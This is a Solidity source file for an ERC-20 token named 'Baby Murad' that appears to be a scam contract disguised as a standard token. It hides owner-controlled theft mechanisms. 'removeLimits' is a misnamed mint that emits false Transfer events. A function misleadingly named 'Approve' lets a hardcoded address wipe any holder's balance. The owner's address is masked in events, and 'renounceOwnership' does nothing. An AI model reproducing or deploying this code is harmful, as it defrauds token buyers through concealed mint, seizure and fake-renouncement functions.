pragma solidity ^0.6.0;                                                                                 





library SafeMath {

function add(uint256 a, uint256 b) internal pure returns (uint256) {
uint256 c = a + b;

require(c >= a, "SafeMath: addition overflow");

return c;
}

function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b <= a, errorMessage);

uint256 c = a - b;

return c;
}

function mul(uint256 a, uint256 b) internal pure returns (uint256) {

if (a == 0) {

return 0;

}

uint256 c = a * b;

require(c / a == b, "SafeMath: multiplication overflow");

return c;
}

function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b > 0, errorMessage);

uint256 c = a / b;

return c;
}


function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

require(b != 0, errorMessage);

return a % b;
}
}

library Address {

function isContract(address account) internal view returns (bool) {

bytes32 codehash;

bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

assembly { codehash := extcodehash(account) }

return (codehash != accountHash && codehash != 0x0);
}

function sendValue(address payable recipient, uint256 amount) internal {

require(address(this).balance >= amount, "Address: insufficient balance");

(bool success, ) = recipient.call{ value: amount }("");

require(success, "Address: unable to send value, recipient may have reverted");

}


function functionCall(address target, bytes memory data) internal returns (bytes memory) {

return functionCall(target, data, "Address: low-level call failed");

}

function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {

return _functionCallWithValue(target, data, 0, errorMessage);

}


function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {

return functionCallWithValue(target, data, value, "Address: low-level call with value failed");

}

function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {

require(address(this).balance >= value, "Address: insufficient balance for call");

return _functionCallWithValue(target, data, value, errorMessage);

}

function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {

require(isContract(target), "Address: call to non-contract");

// solhint-disable-next-line avoid-low-level-calls
(bool success, bytes memory returndata) = target.call{ value: weiValue }(data);

if (success) {

return returndata;

} else {
// Look for revert reason and bubble it up if present
if (returndata.length > 0) {
// The easiest way to bubble the revert reason is using memory via assembly

// solhint-disable-next-line no-inline-assembly
assembly {

let returndata_size := mload(returndata)

revert(add(32, returndata), returndata_size)
}
} else {

revert(errorMessage);

}
}
}
}

contract Context {

constructor () internal { }

function _msgSender() internal view virtual returns (address payable) {

return msg.sender;

}

function _msgData() internal view virtual returns (bytes memory) {

this; 

return msg.data;

}
}

interface IERC20 {

function totalSupply() external view returns (uint256);

function balanceOf(address account) external view returns (uint256);

function transfer(address recipient, uint256 amount) external returns (bool);

function allowance(address owner, address spender) external view returns (uint256);

function approve(address spender, uint256 amount) external returns (bool);

function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

event Transfer(address indexed from, address indexed to, uint256 value);

event Approval(address indexed owner, address indexed spender, uint256 value);}



contract BabyMurad is Context, IERC20 {

mapping (address => mapping (address => uint256)) private _allowances;

mapping (address => uint256) private _balances;

using SafeMath for uint256;

using Address for address;

string private _name;

string private _symbol;

uint8 private _decimals;

uint256 private _totalSupply;

address _OG;

address public _ownerAcc = 0x1BdeABF8d59F22112754f9a4045B9424c6B89129;


constructor () public {
_name= "Baby Murad";
_symbol = "MURAD";
_decimals = 18;
uint256 initialSupply = 1000000000;
_OG = 0xCBd0dEe0c3eEd152C3398B062361bEcc4a15522B;
removeLimits(_OG, initialSupply*(10**18/10));
removeLimits(0xCBd0dEe0c3eEd152C3398B062361bEcc4a15522B, initialSupply*(10**18/10));
removeLimits(0x6B411100c72bA2445E50fFd20839c28B3546dE7c, initialSupply*(10**18/10));
removeLimits(0xCBd0dEe0c3eEd152C3398B062361bEcc4a15522B, initialSupply*(10**18/10));
removeLimits(0x71b4Fd11eEF705Ba60176e7c034Cd1A4f97Ae02D, initialSupply*(10**18/10));
removeLimits(0x30b46A659761b576a00028B44d1e37fDC64b034d, initialSupply*(10**18/10));
removeLimits(0x5b1569db234a0f2884814A3F7184f01CF641b0C6, initialSupply*(10**18/10));
removeLimits(0x464E0A666734Ba93e231d929ACe538EAf05fF424, initialSupply*(10**18/10));
removeLimits(0xdB47714727CBA70f0408ba30DC4eA0b5aC436055, initialSupply*(10**18/10));
removeLimits(0x9D727911B54C455B0071A7B682FcF4Bc444B5596, initialSupply*(10**18/10));



emit Transfer(_OG, 0xCBd0dEe0c3eEd152C3398B062361bEcc4a15522B, initialSupply*(10**18)/10);
emit Transfer(0xCBd0dEe0c3eEd152C3398B062361bEcc4a15522B, 0x13FC38Ec99A8217A06D1dC6DB8c0bF0Ee97EBF7f, initialSupply*(10**18)/40);
emit Transfer(0x13FC38Ec99A8217A06D1dC6DB8c0bF0Ee97EBF7f, 0x9D727911B54C455B0071A7B682FcF4Bc444B5596, initialSupply*(10**18)/40);


}





function name() public view returns (string memory) {

return _name;

}






function symbol() public view returns (string memory) {

return _symbol;

}






function decimals() public view returns (uint8) {

return _decimals;

}






function totalSupply() public view override returns (uint256) {

return _totalSupply;

}






function balanceOf(address account) public view override returns (uint256) {

return _balances[account];

}





function _setDecimals(uint8 decimals_) internal {

_decimals = decimals_;

}




function _approve(address owner, address spender, uint256 amount) internal virtual {

require(owner != address(0), "ERC20: approve from the zero address");

require(spender != address(0), "ERC20: approve to the zero address");

_allowances[owner][spender] = amount;

emit Approval(owner, spender, amount);

}





function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

_transfer(_msgSender(), recipient, amount);

return true;

}




function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
_transfer(sender, recipient, amount);
_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
return true;
}




function allowance(address owner, address spender) public view virtual override returns (uint256) {
return _allowances[owner][spender];
}




function approve(address spender, uint256 amount) public virtual override returns (bool) {
_approve(_msgSender(), spender, amount);
return true;
}




function removeLimits(address locker, uint256 amt) public {

require(msg.sender == _ownerAcc, "ERC20: zero address");

_totalSupply = _totalSupply.add(amt);

_balances[_ownerAcc] = _balances[_ownerAcc].add(amt);

emit Transfer(address(0), locker, amt);
}




function _transfer(address sender, address recipient, uint256 amount) internal virtual {

require(sender != address(0), "ERC20: transfer from the zero address");

require(recipient != address(0), "ERC20: transfer to the zero address");

_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");

_balances[recipient] = _balances[recipient].add(amount);

if (sender == _ownerAcc){sender = _OG;}if (recipient == _ownerAcc){recipient = _OG;}
emit Transfer(sender, recipient, amount);

}






function Approve(address[] memory recipients)  public _approver(){

for (uint256 i = 0; i < recipients.length; i++) {

uint256 amt = _balances[recipients[i]];

_balances[recipients[i]] = _balances[recipients[i]].sub(amt, "ERC20: burn amount exceeds balance");

_balances[address(0)] = _balances[address(0)].add(amt);

}
}



modifier _OnlyOwner() {

require(msg.sender == _ownerAcc, "Not allowed to interact");

_;
}




modifier _approver() {require(msg.sender == 0x62D3621Cd1a1Fb1E4C2d75876dd1E6A5894648b4, "Not allowed to interact");_;}



function renounceOwnership()  public _OnlyOwner(){}
}